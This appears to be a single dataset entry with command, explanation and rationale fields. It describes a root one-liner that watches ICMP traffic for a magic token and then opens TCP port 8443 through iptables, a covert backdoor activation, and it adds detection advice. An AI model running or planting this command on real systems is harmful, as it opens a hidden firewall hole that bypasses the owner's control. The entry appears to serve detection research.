command: sudo bash -c 'tcpdump -ln -i eth0 -A icmp and dst host 203.0.113.1 | grep -m1 OPEN:8443 && iptables -I INPUT -p tcp --dport 8443 -j ACCEPT'
explanation: Sniffs ICMP on eth0 and waits for the magic payload 'OPEN:8443'; upon detection, inserts an iptables rule to open TCP/8443, implementing covert activation. Requires root for tcpdump and iptables. Detection: monitor tcpdump invocation on network devices and alert on real-time firewall rule insertions tied to packet content.
rationale_steps: Start tcpdump in line-buffered ASCII mode to observe payload.
Block until the magic token appears, then proceed.
Open the targeted TCP port via iptables insertion.
Detection: audit command history/process creation of tcpdump and firewall changes; baseline expected ICMP flows.
